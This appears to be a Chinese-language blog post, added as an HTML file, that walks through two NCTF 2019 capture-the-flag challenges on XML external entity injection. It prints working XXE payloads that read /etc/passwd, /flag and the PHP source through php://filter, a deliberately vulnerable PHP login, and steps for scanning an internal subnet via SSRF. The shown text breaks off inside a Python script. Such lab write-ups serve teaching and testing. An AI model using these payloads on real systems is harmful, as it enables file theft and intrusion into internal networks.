@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="XML实体注入原理12XXE 外部实体注入漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，从而导致会加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起 Dos 攻击等危害。XXE 漏洞触发的点往往是可以上传 xml 文件的位置，没有对上传的 xml 文件进行过滤，导致可上传 恶意 xml文件  libxml_disable_entity_loade">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XML实体注入">
+<meta property="og:url" content="https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/">
+<meta property="og:site_name" content="jxdgx">
+<meta property="og:description" content="XML实体注入原理12XXE 外部实体注入漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，从而导致会加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起 Dos 攻击等危害。XXE 漏洞触发的点往往是可以上传 xml 文件的位置，没有对上传的 xml 文件进行过滤，导致可上传 恶意 xml文件  libxml_disable_entity_loade">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20231029132627498.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20231029134313189.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231029135053229.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231029135547529.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231029173947579.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231029174945352.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231030092941322.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231030170233416.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231030170430751.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231030170621017.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231030170801922.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231030170906767.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231030171041725.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231030172946943.png">
+<meta property="article:published_time" content="2022-05-25T13:04:24.000Z">
+<meta property="article:modified_time" content="2026-05-25T13:05:15.944Z">
+<meta property="article:author" content="jxdgx">
+<meta property="article:tag" content="xml实体化注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20231029132627498.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/logo.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+        
+      
+    
+    <!-- title -->
+    <title>XML实体注入 | jxdgx</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+<!-- mathjax -->
+
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+        inlineMath: [['$','$']],
+        displayMath: [['$$','$$'], ['\[','\]']]
+      }
+    });
+  </script>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+
+<meta name="generator" content="Hexo 8.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr is-post-page">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/&text=XML实体注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/&title=XML实体注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/&is_video=false&description=XML实体注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XML实体注入&body=Check out this article: https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/&title=XML实体注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/&title=XML实体注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/&title=XML实体注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/&title=XML实体注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/&name=XML实体注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://dgxddd.github.io/2022/05/25/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/&t=XML实体注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">XML实体注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.</span> <span class="toc-text">前言介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5"><span class="toc-number">1.3.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.4.</span> <span class="toc-text">解题步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">总结：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5-1"><span class="toc-number">1.6.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4-1"><span class="toc-number">1.7.</span> <span class="toc-text">解题步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        
+<div class="post-layout">
+  <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      
+    <h1 class="posttitle p-name" itemprop="name headline">
+        XML实体注入
+    </h1>
+
+
+
+      <div class="meta meta-post">
+        
+    <div class="postdate">
+      
+        <time datetime="2022-05-25T13:04:24.000Z" class="dt-published" itemprop="datePublished">2022-05-25</time>
+        
+      
+    </div>
+
+
+        
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+    </div>
+
+
+        
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/xml%E5%AE%9E%E4%BD%93%E5%8C%96%E6%B3%A8%E5%85%A5/" rel="tag">xml实体化注入</a>
+    </div>
+
+
+      </div>
+    </header>
+    
+
+    <div class="content e-content" itemprop="articleBody">
+      <h1 id="XML实体注入"><a href="#XML实体注入" class="headerlink" title="XML实体注入"></a>XML实体注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XXE 外部实体注入漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，从而导致会加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起 Dos 攻击等危害。</span><br><span class="line">XXE 漏洞触发的点往往是可以上传 xml 文件的位置，没有对上传的 xml 文件进行过滤，导致可上传 恶意 xml文件</span><br></pre></td></tr></table></figure>
+
+<p><code>libxml_disable_entity_loader()</code> 函数用于控制是否允许加载外部实体：其中为true的时侯<strong>禁用</strong>外部实体加载，false 启用外部实体加载</p>
+<h2 id="前言介绍"><a href="#前言介绍" class="headerlink" title="前言介绍"></a>前言介绍</h2><p>如果后续想要学习一些xml的漏洞利用可以去学习这个博客[3. XML实体注入漏洞的利用与学习 - bmjoker - 博客园 (cnblogs.com)](<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9452349.html#:~:text=XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0">https://www.cnblogs.com/bmjoker/p/9452349.html#:~:text=XML实体注入漏洞的利用与学习</a> 前言 XXE Injection即XML,External Entity Injection%2C也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题.在XML1.0标准里%2CXML文档结构里定义了实体 (entity)这个概念.实体可以通过预)</p>
+<p>首先我们了解一下XML的语言结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;//这里是xml声明</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to, from, heading, body)&gt;//文档类型定义</span><br><span class="line">  &lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;jxdgx&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;//这里是文档元素</span><br><span class="line">&lt;/note&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>而在xml文档中外部声明可以引用许多协议如:file，http，ftp,php等</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//这个为外部声明	</span><br><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在实际利用中我们</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;//在这里我们是通过用他的file协议来读取/etc/passwd上面的东西</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;root&lt;/password&gt;&lt;/user&gt;//这里的admin就是上面根元素的名字</span><br></pre></td></tr></table></figure>
+
+<h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1256">NCTF 2019]Fake XML cookbook | NSSCTF</a></p>
+<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>我们打开题目得到了一个日常的登录框，我们随意输入一下弱口令admin&#x2F;123456，这个时候我们可以看到给我们报了错误这个时候我们提交到了doLogin.php在题目名中说明了这个是xml</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20231029132627498.png" alt="image-20231029132627498"></p>
+<p>但是我们访问&#x2F;doLogin.php的时候是错误的，这个时候我们还是向原来一样F12看一下源码，我们可以发现这个是在前端验证的我们这个时候想一下题目名字是xml这个时候我们想到了xxe类型的注入</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20231029134313189.png" alt="image-20231029134313189"></p>
+<p>我们构造出xml语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;//这个是我们用file协议读取/etc/passwd这个文件</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;//在这里的admin就是上面那个根元素，这里要对应</span><br></pre></td></tr></table></figure>
+
+<p>这个时候我们用brup抓包然后讲构造的xml语句上传进行读取&#x2F;etc&#x2F;passwd这个时候我们可以看的了我们读取成功了，</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231029135053229.png" alt="image-20231029135053229"></p>
+<p>这个时候我们就还要读取flag，这个时候我们读取&#x2F;flag（为啥要在根目录下读取是因为一般flag都是在根目录下）</p>
+<p>这个时候我们在根目录下读取到了flag这个主要就是xml语句的使用</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231029135547529.png" alt="image-20231029135547529"></p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>这个题就是一个简单的xml语句的编写主要帮助大家进行学习利用xml这个代码</p>
+<h2 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h2><p>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1257">NCTF 2019]True XML cookbook | NSSCTF</a></p>
+<h2 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>这个题和上面那个题是一个比赛中都是用xml实体来注入但是我们这个时候这个题的flag是不在根目录下面的我们可以访问看一下，我们可以看到这个时候发生了报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;root&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231029173947579.png" alt="image-20231029173947579"></p>
+<p>这个时候我们可以考虑使用php伪协议去读取文件的源码，这个时候我们都知道他的源码文件是doLogin.php我们访问一下看看有没有可以利用的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line"> &lt;!ENTITY admin SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php&quot;&gt;</span><br><span class="line"> ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231029174945352.png" alt="image-20231029174945352"></p>
+<p>我们将上面的base64解密得到了源码文件。我们分析一下这里就是个验证登录的并没有作用这里给了我们账号和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line">* autor: c0ny1</span><br><span class="line">* date: 2018-2-7</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">$USERNAME = &#x27;admin&#x27;; //账号</span><br><span class="line">$PASSWORD = &#x27;024b87931a03f738fff6693ce0a78c88&#x27;; //密码</span><br><span class="line">$result = null;</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line">	$dom = new DOMDocument();</span><br><span class="line">	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	$creds = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">	$username = $creds-&gt;username;</span><br><span class="line">	$password = $creds-&gt;password;</span><br><span class="line"></span><br><span class="line">	if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;</span><br><span class="line">		$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;catch(Exception $e)&#123;</span><br><span class="line">	$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);</span><br><span class="line">echo $result;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个时候我们就想这个是不是在内网的别的网段上面我们可以使用下面这几个命令进行命令探测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/etc/hosts: 此文件包含了主机名与IP地址之间的静态映射关系，用于本地主机名解析。</span><br><span class="line"></span><br><span class="line">/proc/net/arp: 此文件提供了地址解析协议（ARP）缓存的信息，包括IP地址到MAC地址的映射，用于本地网络通信。</span><br><span class="line"></span><br><span class="line">/proc/net/tcp: 此文件包含有关系统上运行的TCP连接的信息，如本地端口、远程端口和连接状态等。</span><br><span class="line"></span><br><span class="line">/proc/net/udp: 此文件包含有关系统上运行的UDP连接的信息，包括本地端口、远程端口和连接状态等。</span><br><span class="line"></span><br><span class="line">/proc/net/dev: 此目录包含有关系统上网络设备（网卡）的详细信息，包括接口的名称、传输统计和错误计数等。</span><br><span class="line"></span><br><span class="line">/proc/net/fib_trie: 此文件包含了用于路由表的前缀树数据结构（FIB Trie），用于高效的IP路由和查找。</span><br></pre></td></tr></table></figure>
+
+<p>我们可以去查看一下他的&#x2F;etc&#x2F;hosts这个文件来看看，又没有别的收获，我们可以看到这是没有啥的</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231030092941322.png" alt="image-20231030092941322"></p>
+<p>我们可以用&#x2F;proc&#x2F;net&#x2F;fib_trie来查找一下看有没有别的路由，这个时候我们看一下，我们可以看一下这里面的ip我们发现可以利用的就有169.254.1.1和10.244.81.62网段的ip但是169.254.1.1网段是广播地址不可能是的，我们现在就访问10.244.80.147网段的，我们使用http服务去访问。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line"> &lt;!ENTITY admin SYSTEM &quot;file:///proc/net/fib_trie&quot;&gt;</span><br><span class="line"> ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231030170233416.png" alt="image-20231030170233416"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line"> &lt;!ENTITY admin SYSTEM &quot;http://10.244.81.62&quot;&gt;</span><br><span class="line"> ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们发现在这个ip下是没有的，我们可以扫描一下他的c段用burp来设置爆破一下从而来实现，</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231030170430751.png" alt="image-20231030170430751"></p>
+<p>这个时候我们在burp中设置载荷，我们首先发到测试器然后我们先进行清除然后添加最后一个字段，这里我们要对最后一个字段进行发包</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231030170621017.png" alt="image-20231030170621017"></p>
+<p>然后我们在有效载荷这里进行下面的设置，都设置好后我们进行攻击</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231030170801922.png" alt="image-20231030170801922"></p>
+<p>然后在位置这里点击攻击</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231030170906767.png" alt="image-20231030170906767"></p>
+<p>然后我们查看爆破数据的长度有一个和大部分不一样的这个就是我们要访问的，这是因为在不是flag的地方我们基本都是访问相同的页面所以他们长度一样，在这里我们看到了这个长度不一样，说明它好别的页面访问呢有所不同。</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231030171041725.png" alt="image-20231030171041725"></p>
+<p>首先这个方法因为在内网中有些访问呢比较慢我们可以用python脚本发包这个时候来提升我们的速度。在python中我们减少响应的时间来发包</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义要请求的URL，替换为正确的URL</span></span><br><span class="line">url = <span 